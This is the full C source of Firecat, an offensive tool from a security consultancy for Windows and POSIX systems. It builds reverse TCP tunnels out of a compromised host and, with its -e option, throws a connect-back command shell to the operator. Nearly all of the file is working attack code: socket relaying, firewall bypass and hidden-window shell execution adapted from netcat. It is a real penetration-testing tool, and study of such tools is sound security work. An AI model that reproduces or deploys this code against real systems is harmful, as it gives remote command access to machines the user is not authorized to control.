/*
 * Firecat
 * Copyright (C) 2008-2011 Stach & Liu LLC
 * 
 * Firecat allows you to punch reverse TCP tunnels out of a compromised host,
 * enabling you to connect to arbitrary host/ports on the target network regardless of
 * ingress firewall rules. 
 *
 * It incorporates code from netcat for Windows, specifically the "-e" command execution code.
 *
 */
#define VERSION "1.6"

#include <sys/types.h>
#ifdef __WIN32__
	#include <windows.h>
	#define _INC_WINDOWS
	#include <winbase.h>
	#include <winsock2.h>
	#define SHUT_RDWR SD_BOTH
#else
	#include <sys/socket.h>
	#include <netdb.h>
	#include <netinet/in.h>
	#include <arpa/inet.h>
	#ifdef _POSIX_VERSION
		#if _POSIX_VERSION >= 200112L
			#include <sys/select.h>
		#endif
	#endif
#endif
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#ifdef __WIN32__ 
#define CMD_SHELL "c:\\windows\\system32\\cmd.exe"
#else
#define CMD_SHELL "/bin/sh"
#endif

#ifndef max
	int max(const int x, const int y) {
		return (x > y) ? x : y;
	}
#endif
       
#define BUF_SIZE 1024
#define DOEXEC_BUFFER_SIZE 200 // twiddle for windows doexec stuff. ctrl-f for "nc111nt.zip"

enum MODES { CONSULTANT_MODE, TARGET_MODE };
extern char *optarg;
extern int optind, opterr, optopt;
char *pr00gie=NULL; // from nc111nt. see doexec stuff, below.
const char *usageString = ""
"FireCat v"VERSION" - Copyright 2008-2011 Stach & Liu\n\n" \
"Usage: firecat -m <mode> [options]\n\n" \
"  -m <mode>       0 = consultant, 1 = target\n\n" \
"In consultant mode:\n\n" \
"  -t <port>       Wait for incoming connections from target on this port\n" \
"  -s <port>       Wait for incoming connections from you on this port\n" \
"                  Connections to this port will be forwarded over tunnel\n\n" \
"In target mode:\n\n" \
"  -h <host>       Connect back to <host> (your IP)\n" \
"  -t <port>       Connect back to TCP <port> on <host>\n" \
"  -H <target>     (optional) Connect to <target> inside the target network\n" \
"                  Default: localhost\n"
"  -e              Throw a connect-back shell to <host>:<port> on your box\n" \
"       or\n" \
"  -s <port>       Create a tunnel to <target>:<port> inside the target network\n\n";

void usage(void) {
	puts(usageString);
}

int do_consultant(const int tunnelPort, const int servicePort);
int do_target(const char *consultantHost, const char *targetHost, const int tunnelPort, const int servicePort);
int listen_socket(const int listen_port);
int connect_socket(const int connect_port, const char *address);
int shovel_data(const int fd1, const int fd2);
void close_sock(const int fd);
#ifdef __WIN32__
BOOL doexec(SOCKET  ClientSocket);
#else
void doexec(int sock);
#endif
    
/*************************
 * main
 */
int main(int argc, char **argv) {
	int opt, retVal;
	char consultantHost[BUF_SIZE];
	char targetHost[BUF_SIZE];
	int tunnelPort = 0, servicePort = 0, mode = 0xff;
	
	memset(consultantHost, 0, BUF_SIZE);
	memset(targetHost, 0, BUF_SIZE);
	strncpy(targetHost, "localhost", BUF_SIZE);
	
	// parse commandline
	while((opt = getopt(argc, argv, "m:t:s:h:H:e")) != -1) {
		switch(opt) {
			case 'm':
				mode = (int)strtol(optarg, NULL, 10);
				if(mode != 0 && mode != 1) {
					usage();
					exit(1);
				}
				break;
			case 't':
				tunnelPort = (int)strtol(optarg, NULL, 10);
				break;
			case 's':
				servicePort = (int)strtol(optarg, NULL, 10);
				break;
			case 'H':
				strncpy(targetHost, optarg, BUF_SIZE);
				break;
			case 'h':
				strncpy(consultantHost, optarg, BUF_SIZE);
				break;
			case 'e':
				pr00gie=strdup(CMD_SHELL);
				break;
			default:
				usage();
				exit(1);
				break;
		}
	}

	// Windows requires extra fiddling
	#ifdef __WIN32__
		WORD wVersionRequested;
		WSADATA wsaData;
		wVersionRequested = MAKEWORD( 1, 1 );
		WSAStartup( wVersionRequested, &wsaData );
	#endif
	
	// In consultant 
	if(mode == CONSULTANT_MODE) {
		if(!tunnelPort || !servicePort) {
			usage();
			exit(1);
		}
		retVal = do_consultant(tunnelPort, servicePort);
	} else if(mode == TARGET_MODE) {
		if(!(tunnelPort && (servicePort || pr00gie)) || !consultantHost[0] || (servicePort && pr00gie)) {
			usage();
			exit(1);
		}
		retVal = do_target(consultantHost, targetHost, tunnelPort, servicePort);
	} else {
		usage();
		exit(1);
	}
	
	exit(retVal);
}

/****************************
 * do_consultant()
 *
 * Waits for a connection from the target on port 'tunnelPort'.
 * Once received, waits for connection from local client on port 'servicePort'.
 * Once received, shovels bytes between the two endpoints.
 */ 
int do_consultant(const int tunnelPort, const int servicePort) {
	int tunnelSock, serviceSock, targetSock, clientSock;
	unsigned int i;
	struct sockaddr_in targetAddr, clientAddr;
	char buf[BUF_SIZE + 1];
	
	// wait for connection from the remote target host
	if((tunnelSock = listen_socket(tunnelPort)) == -1)
		return 1;
	i = sizeof(targetAddr);
	printf("Consultant: Waiting for the remote target to establish the tunnel on port %d\n",tunnelPort);
	if((targetSock = accept(tunnelSock, (struct sockaddr *)&targetAddr, &i)) == -1) {
		perror("ERROR: accept()");
		return 1;
	}
	printf("Consultant: Got connection from remote target %s\n", inet_ntoa(targetAddr.sin_addr));
	
	// wait for an 'OK' from the target
	printf("Consultant: Waiting for ACK...\n");
	if(recv(targetSock, buf, 2, 0) == -1) {
		perror("ERROR: recv()");
		return 1;
	}
		
	if(buf[0] != 'O' || buf[1] != 'K') {
		printf("ERROR: Failed to acknowledge tunnel\n");
		return 1;
	}
	printf("Consultant: Received ACK, tunnel is established\n");
		
	// ok, tunnel is up and running
	// wait for connection from the local client program before sending an OK down the tunnel
	if((serviceSock = listen_socket(servicePort)) == -1)
		return 1;
	i = sizeof(clientAddr);

	printf("Consultant: Tunnel is now up on localhost:%d\n", servicePort);
	printf("            Connections will be forwarded to target host.\n");
	if((clientSock = accept(serviceSock,(struct sockaddr *) &clientAddr, &i)) == -1) {
		perror("ERROR: accept()");
		return 1;
	}
	printf("Consultant: Got connection from local client %s\n", inet_ntoa(clientAddr.sin_addr));
	printf("Consultant: Telling remote target host...\n");

	// send an 'OK'
	if(send(targetSock, "OK", 2, 0) == -1) {
		perror("ERROR: send()");
		return 1;
	}
	printf("Consultant: Wo0t! You are connected. Shovelling data... press CTRL-C to abort\n");
	
	// shovel data between the client and the target
	return shovel_data(targetSock, clientSock);
}

/***********************
 * do_target()
 *
 * Connects to the consultant's machine on port 'tunnelPort'
 * Once established, waits for an 'OK' that signifies the client has connected.
 * Once received, connects locally to the port specified by 'servicePort'
 * and shovels bits across the tunnel between the client program and the local service port.
 */
int do_target(const char *consultantHost, const char *targetHost, const int tunnelPort, const int servicePort) {
	int tunnelSock, serviceSock;
	char buf[BUF_SIZE];
	
	// connect to the consultant's host
	printf("Target: Establishing tunnel with remote host on %s:%d\n", consultantHost, tunnelPort);
	if((tunnelSock = connect_socket(tunnelPort, consultantHost)) == -1)
		return 1;

	// send an ACK
	if(send(tunnelSock, "OK", 2, 0) == -1) {
		perror("ERROR: send()");
		return 1;
	}
	printf("Target: Tunnel is up, waiting for client to connect on remote end...\n");
	
	// wait for an ACK from the consultant before connecting to the local service
	if(recv(tunnelSock, buf, 2, 0) == -1) {
		perror("ERROR: recv()");
		return 1;
	}
	if(buf[0] != 'O' || buf[1] != 'K') {
		printf("ERROR: Failed to acknowledge tunnel\n");
		return 1;
	}
	printf("Target: Client has connected on the remote end\n");

	// spawn a connect-back shell if needed
	if(pr00gie) {		
		doexec(tunnelSock);
		return 1; // we only hit this on exec() throwing an error 
	} 
	
	// if we're not spawning a shell we must be building a tunnel. Let's do it!
	// connect to local service
	printf("Target: Connecting to local service port %d\n", servicePort);		
	if((serviceSock = connect_socket(servicePort, targetHost)) == -1)
		return 1;
	printf("Target: Connected to service port %s:%d\n", targetHost, servicePort);
	printf("Target: Shovelling data across the tunnel...\n");
	
	// shovel data between the client and the target
	return shovel_data(tunnelSock, serviceSock);	
}

#ifndef __WIN32__
/************************
 * doexec() 
 *
 * For *nix - redirects stdin, stdout, stderr to the tunnel socket
 * and then spawns a command shell.
 * Based on code from netcat.
 */
void doexec(int sock) {
	char *p=pr00gie;
	
	dup2(sock, 0);
	close(sock);
	dup2(0, 1);
	dup2(0, 2);
	if((p=strrchr(pr00gie, '/')))
		p++;
	execl(pr00gie, p, NULL);
}
#endif

/************************
 * shovel_data()
 *
 * Data forwarding code that performs bidirectional tunneling between two end point sockets.
 */
int shovel_data(const int fd1, const int fd2) {
	fd_set rd, wr, er;	
	char c, buf1[BUF_SIZE], buf2[BUF_SIZE];
	int r, nfds;
	int buf1_avail = 0, buf1_written = 0;
	int buf2_avail = 0, buf2_written = 0;
	
	// Loop forever. This requires a CTRL-C or disconnected socket to abort.
	while(1) {
		// ensure things are sane each time around
		nfds = 0;
		FD_ZERO(&rd);
		FD_ZERO(&wr);
		FD_ZERO(&er);
		
		// setup the arrays for monitoring OOB, read, and write events on the 2 sockets
		if(buf1_avail < BUF_SIZE) {
		   FD_SET(fd1, &rd);
		   nfds = max(nfds, fd1);
		}
		if(buf2_avail < BUF_SIZE) {
		   FD_SET(fd2, &rd);
		   nfds = max(nfds, fd2);
		}
		if((buf2_avail - buf2_written) > 0) {
		   FD_SET(fd1, &wr);
		   nfds = max(nfds, fd1);
		}
		if((buf1_avail - buf1_written) > 0) {
		   FD_SET(fd2, &wr);
		   nfds = max(nfds, fd2);
		}
		FD_SET(fd1, &er);
		nfds = max(nfds, fd1);
		FD_SET(fd2, &er);
		nfds = max(nfds, fd2);
		
		// wait for something interesting to happen on a socket, or abort in case of error
		if(select(nfds + 1, &rd, &wr, &er, NULL) == -1)
			return 1;
	
		// OOB data ready
		if(FD_ISSET(fd1, &er)) {
			if(recv(fd1, &c, 1, MSG_OOB) < 1) {
				return 1;
			} else {
				if(send(fd2, &c, 1, MSG_OOB) < 1) {
					perror("ERROR: send()");
					return 1;
				}
			}
		}
		if(FD_ISSET(fd2, &er)) {
			if(recv(fd2, &c, 1, MSG_OOB) < 1) {
				return 1;
			} else {
				if(send(fd1, &c, 1, MSG_OOB) < 1) {
					perror("ERROR: send()");
					return 1;
				}
			}
		}
		
		// Data ready to read from socket(s)
		if(FD_ISSET(fd1, &rd)) {
			if((r = recv(fd1, buf1 + buf1_avail, BUF_SIZE - buf1_avail, 0)) < 1)
				return 1;
			else
				buf1_avail += r;
		}
		if(FD_ISSET(fd2, &rd)) {
			if((r = recv(fd2, buf2 + buf2_avail, BUF_SIZE - buf2_avail, 0))  < 1)
				return 1;
			else
				buf2_avail += r;
		}
		
		// Data ready to write to socket(s)
		if(FD_ISSET(fd1, &wr)) {
			if((r = send(fd1, buf2 + buf2_written,	buf2_avail - buf2_written, 0)) < 1)
				return 1;
			else
				buf2_written += r;
		}
		if(FD_ISSET(fd2, &wr)) {
			if((r = send(fd2, buf1 + buf1_written, buf1_avail - buf1_written, 0)) < 1)
				return 1;
			else
				buf1_written += r;
		}
		// Check to ensure written data has caught up with the read data
		if(buf1_written == buf1_avail)
			buf1_written = buf1_avail = 0;
		if(buf2_written == buf2_avail)
			buf2_written = buf2_avail = 0;
	}
}

/************************
 * listen_socket()
 *
 * Sets up a socket, bind()s it to all interfaces, then listen()s on it.
 * Returns a valid socket, or -1 on failure
 */
int listen_socket(const int listen_port)
{
	struct sockaddr_in a;
	int s;
	int yes = 1;

	// get a fresh juicy socket
	if((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		perror("ERROR: socket()");
		return -1;
	}
	
	// make sure it's quickly reusable
	if(setsockopt(s, SOL_SOCKET, SO_REUSEADDR,	(char *) &yes, sizeof(yes)) < 0) {
		perror("ERROR: setsockopt()");
		close(s);
		return -1;
	}
	
	// listen on all of the hosts interfaces/addresses (0.0.0.0)
	memset(&a, 0, sizeof(a));
	a.sin_port = htons(listen_port);
	a.sin_addr.s_addr = htonl(INADDR_ANY);
	a.sin_family = AF_INET;
	if(bind(s, (struct sockaddr *) &a, sizeof(a)) < 0) {
		perror("ERROR: bind()");
		close(s);
		return -1;
	}
	listen(s, 10);
	return s;
}

/*****************
 * connect_socket()
 *
 * Connects to a remote host:port and returns a valid socket if successful.
 * Returns -1 on failure.
 */
int connect_socket(const int connect_port, const char *address) {
	struct sockaddr_in a;
	struct hostent *ha;
	int s;
	
	// get a fresh juicy socket
	if((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		perror("ERROR: socket()");
		close(s);
		return -1;
	}

	// clear the sockaddr_in structure
	memset(&a, 0, sizeof(a));
	a.sin_port = htons(connect_port);
	a.sin_family = AF_INET;
	
	// get IP from host name, if appropriate
	if((ha = gethostbyname(address)) == NULL) {
		perror("ERROR: gethostbyname()");
		return -1;
	}
	if(ha->h_length == 0) {
		printf("ERROR: No addresses for %s. Aborting.\n", address);
		return -1;
	}
	memcpy(&a.sin_addr, ha->h_addr_list[0], ha->h_length);

	// connect to the remote host
	if(connect(s, (struct sockaddr *) &a, sizeof(a)) < 0) {
		perror("ERROR: connect()");
		shutdown(s, SHUT_RDWR);
		close(s);
		return -1;
	}
	
	// w00t, it worked.
	return s;
}

// this deals with windows' broken dup() system. 
// all this for a little dup2, dup2, exec? dang.
#ifdef __WIN32__ 

/*************************
 * Everything below here is taken from doexec.c in the nc111nt.zip version of netcat for Windows.
 * I've included license.txt from the original archive.
 */

// for license see license.txt

// Modified 5/4/2011 by Carl Livitt
// twiddled it to work as copy pasta inside firecat

// Modified 12/27/2004 by Chris Wysopal <weld@vulnwatch.com> 
// fixed vulnerability found by hat-squad

// portions Copyright (C) 1994 Nathaniel W. Mishkin
// code taken from rlogind.exe

void holler(char * str, char * p1, char * p2, char * p3, char * p4, char * p5, char * p6);
char *winsockstr(int error);
char smbuff[20];
//
// Structure used to describe each session
//
typedef struct {

    //
    // These fields are filled in at session creation time
    //
    HANDLE  ReadPipeHandle;         // Handle to shell stdout pipe
    HANDLE  WritePipeHandle;        // Handle to shell stdin pipe
    HANDLE  ProcessHandle;          // Handle to shell process

    //
    //
    // These fields are filled in at session connect time and are only
    // valid when the session is connected
    //
    SOCKET  ClientSocket;
    HANDLE  ReadShellThreadHandle;  // Handle to session shell-read thread
    HANDLE  WriteShellThreadHandle; // Handle to session shell-read thread

} SESSION_DATA, *PSESSION_DATA;


//
// Private prototypes
//

static HANDLE
StartShell(
    HANDLE StdinPipeHandle,
    HANDLE StdoutPipeHandle
    );

static VOID
SessionReadShellThreadFn(
    LPVOID Parameter
    );

static VOID
SessionWriteShellThreadFn(
    LPVOID Parameter
    );



// **********************************************************************
//
// CreateSession
//
// Creates a new session. Involves creating the shell process and establishing
// pipes for communication with it.
//
// Returns a handle to the session or NULL on failure.
//

static PSESSION_DATA
CreateSession(
    VOID
    )
{
    PSESSION_DATA Session = NULL;
    BOOL Result;
    SECURITY_ATTRIBUTES SecurityAttributes;
    HANDLE ShellStdinPipe = NULL;
    HANDLE ShellStdoutPipe = NULL;

    //
    // Allocate space for the session data
    //
    Session = (PSESSION_DATA) malloc(sizeof(SESSION_DATA));
    if (Session == NULL) {
        return(NULL);
    }

    //
    // Reset fields in preparation for failure
    //
    Session->ReadPipeHandle  = NULL;
    Session->WritePipeHandle = NULL;


    //
    // Create the I/O pipes for the shell
    //
    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
    SecurityAttributes.bInheritHandle = TRUE; // Shell will inherit handles

    Result = CreatePipe(&Session->ReadPipeHandle, &ShellStdoutPipe,
                          &SecurityAttributes, 0);
    if (!Result) {
        holler("Failed to create shell stdout pipe, error = %s",
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);
        goto Failure;
    }
    Result = CreatePipe(&ShellStdinPipe, &Session->WritePipeHandle,
                        &SecurityAttributes, 0);

    if (!Result) {
        holler("Failed to create shell stdin pipe, error = %s",  
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);
        goto Failure;
    }
    //
    // Start the shell
    //
    Session->ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe);

    //
    // We're finished with our copy of the shell pipe handles
    // Closing the runtime handles will close the pipe handles for us.
    //
    CloseHandle(ShellStdinPipe);
    CloseHandle(ShellStdoutPipe);

    //
    // Check result of shell start
    //
    if (Session->ProcessHandle == NULL) {
        holler("Failed to execute shell", NULL,
			 NULL, NULL, NULL, NULL, NULL);
			
        goto Failure;
    }

    //
    // The session is not connected, initialize variables to indicate that
    //
    Session->ClientSocket = INVALID_SOCKET;

    //
    // Success, return the session pointer as a handle
    //
    return(Session);

Failure:

    //
    // We get here for any failure case.
    // Free up any resources and exit
    //

    if (ShellStdinPipe != NULL) 
        CloseHandle(ShellStdinPipe);
    if (ShellStdoutPipe != NULL) 
        CloseHandle(ShellStdoutPipe);
    if (Session->ReadPipeHandle != NULL) 
        CloseHandle(Session->ReadPipeHandle);
    if (Session->WritePipeHandle != NULL) 
        CloseHandle(Session->WritePipeHandle);

    free(Session);

    return(NULL);
}



BOOL
doexec(
    SOCKET  ClientSocket
    )
{
    PSESSION_DATA   Session = CreateSession();
    SECURITY_ATTRIBUTES SecurityAttributes;
    DWORD ThreadId;
    HANDLE HandleArray[3];
	int i;

    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
    SecurityAttributes.bInheritHandle = FALSE; // No inheritance

    //
    // Store the client socket handle in the session structure so the thread
    // can get at it. This also signals that the session is connected.
    //
    Session->ClientSocket = ClientSocket;

    //
    // Create the session threads
    //
    Session->ReadShellThreadHandle = 
        CreateThread(&SecurityAttributes, 0,
                     (LPTHREAD_START_ROUTINE) SessionReadShellThreadFn, 
                     (LPVOID) Session, 0, &ThreadId);

    if (Session->ReadShellThreadHandle == NULL) {
        holler("Failed to create ReadShell session thread, error = %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

        //
        // Reset the client pipe handle to indicate this session is disconnected
        //
        Session->ClientSocket = INVALID_SOCKET;
        return(FALSE);
    }

    Session->WriteShellThreadHandle = 
        CreateThread(&SecurityAttributes, 0, 
                     (LPTHREAD_START_ROUTINE) SessionWriteShellThreadFn, 
                     (LPVOID) Session, 0, &ThreadId);

    if (Session->WriteShellThreadHandle == NULL) {
        holler("Failed to create ReadShell session thread, error = %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

        //
        // Reset the client pipe handle to indicate this session is disconnected
        //
        Session->ClientSocket = INVALID_SOCKET;

        TerminateThread(Session->WriteShellThreadHandle, 0);
        return(FALSE);
    }

    //
    // Wait for either thread or the shell process to finish
    //

    HandleArray[0] = Session->ReadShellThreadHandle;
    HandleArray[1] = Session->WriteShellThreadHandle;
    HandleArray[2] = Session->ProcessHandle;

	
    i = WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff);
    
	
	switch (i) {
      case WAIT_OBJECT_0 + 0:
        TerminateThread(Session->WriteShellThreadHandle, 0);
        TerminateProcess(Session->ProcessHandle, 1);
        break;

      case WAIT_OBJECT_0 + 1:
        TerminateThread(Session->ReadShellThreadHandle, 0);
        TerminateProcess(Session->ProcessHandle, 1);
        break;
      case WAIT_OBJECT_0 + 2:
        TerminateThread(Session->WriteShellThreadHandle, 0);
        TerminateThread(Session->ReadShellThreadHandle, 0);
        break;
 
	  default:
        holler("WaitForMultipleObjects error: %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

        break;
    }


    // Close my handles to the threads, the shell process, and the shell pipes
	shutdown(Session->ClientSocket, SD_BOTH);
  	closesocket(Session->ClientSocket);
	
	DisconnectNamedPipe(Session->ReadPipeHandle);
    CloseHandle(Session->ReadPipeHandle);

	DisconnectNamedPipe(Session->WritePipeHandle);
    CloseHandle(Session->WritePipeHandle);


    CloseHandle(Session->ReadShellThreadHandle);
    CloseHandle(Session->WriteShellThreadHandle);

    CloseHandle(Session->ProcessHandle);
 
    free(Session);

    return(TRUE);
}


// **********************************************************************
//
// StartShell
//
// Execs the shell with the specified handle as stdin, stdout/err
//
// Returns process handle or NULL on failure
//

static HANDLE
StartShell(
    HANDLE ShellStdinPipeHandle,
    HANDLE ShellStdoutPipeHandle
    )
{
    PROCESS_INFORMATION ProcessInformation;
    STARTUPINFO si;
    HANDLE ProcessHandle = NULL;

    //
    // Initialize process startup info
    //
    si.cb = sizeof(STARTUPINFO);
    si.lpReserved = NULL;
    si.lpTitle = NULL;
    si.lpDesktop = NULL;
    si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
    si.wShowWindow = SW_HIDE;
    si.lpReserved2 = NULL;
    si.cbReserved2 = 0;

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    si.hStdInput  = ShellStdinPipeHandle;
    si.hStdOutput = ShellStdoutPipeHandle;

    DuplicateHandle(GetCurrentProcess(), ShellStdoutPipeHandle, 
                    GetCurrentProcess(), &si.hStdError,
                    DUPLICATE_SAME_ACCESS, TRUE, 0);

    if (CreateProcess(NULL, pr00gie, NULL, NULL, TRUE, 0, NULL, NULL,
                      &si, &ProcessInformation)) 
    {
        ProcessHandle = ProcessInformation.hProcess;
        CloseHandle(ProcessInformation.hThread);
    } 
    else 
        holler("Failed to execute shell, error = %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);


    return(ProcessHandle);
}


// **********************************************************************
// SessionReadShellThreadFn
//
// The read thread procedure. Reads from the pipe connected to the shell
// process, writes to the socket.
//

static VOID
SessionReadShellThreadFn(
    LPVOID Parameter
    )
{
    PSESSION_DATA Session = Parameter;
    BYTE    Buffer[DOEXEC_BUFFER_SIZE];
    BYTE    Buffer2[DOEXEC_BUFFER_SIZE*2+30];
    DWORD   BytesRead;

	// this bogus peek is here because win32 won't let me close the pipe if it is
	// in waiting for input on a read.
    while (PeekNamedPipe(Session->ReadPipeHandle, Buffer, sizeof(Buffer), 
                    &BytesRead, NULL, NULL)) 
    {
		DWORD BufferCnt, BytesToWrite;
        BYTE PrevChar = 0;

		if (BytesRead > 0)
		{
			ReadFile(Session->ReadPipeHandle, Buffer, sizeof(Buffer), 
                    &BytesRead, NULL);
		}
		else
		{
			Sleep(50);
			continue;
		}


        
        //
        // Process the data we got from the shell:  replace any naked LF's
        // with CR-LF pairs.
        //
        for (BufferCnt = 0, BytesToWrite = 0; BufferCnt < BytesRead; BufferCnt++) {
            if (Buffer[BufferCnt] == '\n' && PrevChar != '\r')
                Buffer2[BytesToWrite++] = '\r';
            PrevChar = Buffer2[BytesToWrite++] = Buffer[BufferCnt];
        }

        if (send(Session->ClientSocket, Buffer2, BytesToWrite, 0) <= 0) 
            break;
    }

    if (GetLastError() != ERROR_BROKEN_PIPE)
        holler("SessionReadShellThreadFn exitted, error = %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

	ExitThread(0);
}


// **********************************************************************
// SessionWriteShellThreadFn
//
// The write thread procedure. Reads from socket, writes to pipe connected
// to shell process.  


static VOID
SessionWriteShellThreadFn(
    LPVOID Parameter
    )
{
    PSESSION_DATA Session = Parameter;
    BYTE    RecvBuffer[1];
    BYTE    Buffer[DOEXEC_BUFFER_SIZE];
    DWORD   BytesWritten;
    DWORD   BufferCnt;

    BufferCnt = 0;

    //
    // Loop, reading one byte at a time from the socket.    
    //
    while (recv(Session->ClientSocket, RecvBuffer, sizeof(RecvBuffer), 0) != 0) {

        Buffer[BufferCnt++] = RecvBuffer[0];
        if (RecvBuffer[0] == '\r')
                Buffer[BufferCnt++] = '\n';


		// Trap exit as it causes problems
		if (strnicmp(Buffer, "exit\r\n", 6) == 0)
			ExitThread(0);


        //
        // If we got a CR, it's time to send what we've buffered up down to the
        // shell process.
        // SECURITY FIX: CW 12/27/04 Add BufferCnt size check.  If we hit end of buffer, flush it
        if (RecvBuffer[0] == '\n' || RecvBuffer[0] == '\r' || BufferCnt > DOEXEC_BUFFER_SIZE-1) {
            if (! WriteFile(Session->WritePipeHandle, Buffer, BufferCnt, 
                            &BytesWritten, NULL))
            {
                break;
            }
            BufferCnt = 0;
        }
    }

	ExitThread(0);
}

// ripped from netcat.c
/* holler :
   fake varargs -- need to do this way because we wind up calling through
   more levels of indirection than vanilla varargs can handle, and not all
   machines have vfprintf/vsyslog/whatever!  6 params oughta be enough. */
void holler (str, p1, p2, p3, p4, p5, p6)
  char * str;
  char * p1, * p2, * p3, * p4, * p5, * p6;
{
    fprintf (stderr, str, p1, p2, p3, p4, p5, p6);
#ifdef WIN32
	if (h_errno)
		fprintf (stderr, ": %s\n",winsockstr(h_errno));
#else
    if (errno) {		/* this gives funny-looking messages, but */
      perror (" ");		/* it's more portable than sys_errlist[]... */
    }				/* xxx: do something better.  */
    				/* yyy: did something worse. */
#endif
	else
      fprintf (stderr, "\n");
    fflush (stderr);
} /* holler */

/* winsockstr
   Windows Sockets cannot report errors through perror() so we need to define
   our own error strings to print. Someday all the string should be prettied up.
   Prettied the errors I usually get */
char * winsockstr(error)
int error;
{
	switch (error)
	{
	case WSAEINTR          : return("INTR          ");
	case WSAEBADF          : return("BADF          ");
	case WSAEACCES         : return("ACCES         ");
	case WSAEFAULT         : return("FAULT         ");
	case WSAEINVAL         : return("INVAL         ");
	case WSAEMFILE         : return("MFILE         ");
	case WSAEWOULDBLOCK    : return("WOULDBLOCK    ");
	case WSAEINPROGRESS    : return("INPROGRESS    ");
	case WSAEALREADY       : return("ALREADY       ");
	case WSAENOTSOCK       : return("NOTSOCK       ");
	case WSAEDESTADDRREQ   : return("DESTADDRREQ   ");
	case WSAEMSGSIZE       : return("MSGSIZE       ");
	case WSAEPROTOTYPE     : return("PROTOTYPE     ");
	case WSAENOPROTOOPT    : return("NOPROTOOPT    ");
	case WSAEPROTONOSUPPORT: return("PROTONOSUPPORT");
	case WSAESOCKTNOSUPPORT: return("SOCKTNOSUPPORT");
	case WSAEOPNOTSUPP     : return("OPNOTSUPP     ");
	case WSAEPFNOSUPPORT   : return("PFNOSUPPORT   ");
	case WSAEAFNOSUPPORT   : return("AFNOSUPPORT   ");
	case WSAEADDRINUSE     : return("ADDRINUSE     ");
	case WSAEADDRNOTAVAIL  : return("ADDRNOTAVAIL  ");
	case WSAENETDOWN       : return("NETDOWN       ");
	case WSAENETUNREACH    : return("NETUNREACH    ");
	case WSAENETRESET      : return("NETRESET      ");
	case WSAECONNABORTED   : return("CONNABORTED   ");
	case WSAECONNRESET     : return("CONNRESET     ");
	case WSAENOBUFS        : return("NOBUFS        ");
	case WSAEISCONN        : return("ISCONN        ");
	case WSAENOTCONN       : return("NOTCONN       ");
	case WSAESHUTDOWN      : return("SHUTDOWN      ");
	case WSAETOOMANYREFS   : return("TOOMANYREFS   ");
	case WSAETIMEDOUT      : return("TIMEDOUT      ");
	case WSAECONNREFUSED   : return("connection refused");
	case WSAELOOP          : return("LOOP          ");
	case WSAENAMETOOLONG   : return("NAMETOOLONG   ");
	case WSAEHOSTDOWN      : return("HOSTDOWN      ");
	case WSAEHOSTUNREACH   : return("HOSTUNREACH   ");
	case WSAENOTEMPTY      : return("NOTEMPTY      ");
	case WSAEPROCLIM       : return("PROCLIM       ");
	case WSAEUSERS         : return("USERS         ");
	case WSAEDQUOT         : return("DQUOT         ");
	case WSAESTALE         : return("STALE         ");
	case WSAEREMOTE        : return("REMOTE        ");
	case WSAEDISCON        : return("DISCON        ");
	case WSASYSNOTREADY    : return("SYSNOTREADY    ");
	case WSAVERNOTSUPPORTED: return("VERNOTSUPPORTED");
	case WSANOTINITIALISED : return("NOTINITIALISED ");
	case WSAHOST_NOT_FOUND : return("HOST_NOT_FOUND ");
	case WSATRY_AGAIN      : return("TRY_AGAIN      ");
	case WSANO_RECOVERY    : return("NO_RECOVERY    ");
	case WSANO_DATA        : return("NO_DATA        ");
	default : return("unknown socket error");
	}
}
#endif

